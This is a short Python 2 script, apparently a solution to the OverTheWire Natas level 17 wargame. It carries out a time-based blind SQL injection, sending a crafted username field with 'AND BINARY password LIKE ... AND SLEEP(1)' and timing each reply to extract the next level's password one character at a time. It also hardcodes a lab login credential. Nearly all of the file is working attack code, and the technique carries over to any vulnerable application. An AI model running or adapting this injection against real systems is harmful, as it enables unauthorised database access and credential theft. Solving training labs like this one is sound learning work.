#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re
from string import *
from time import *

characters = lowercase + uppercase + digits

username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# response = session.get(url, auth = (username, password) )

seen_password = list()
while ( len(seen_password) < 32 ):

	for character in characters:
		start_time = time()

		# print "start_time", start_time
		print "trying", "".join(seen_password) + character
		response = session.post(url, data = {"username": 'natas18" AND BINARY password LIKE "' + "".join(seen_password) + character +  '%" AND SLEEP(1) # '}, auth = (username, password) )
		content = response.text
		end_time = time()
		difference = end_time - start_time
		

		if ( difference > 1 ):
			# success, correct character!
			seen_password.append(character)
			break
		# print content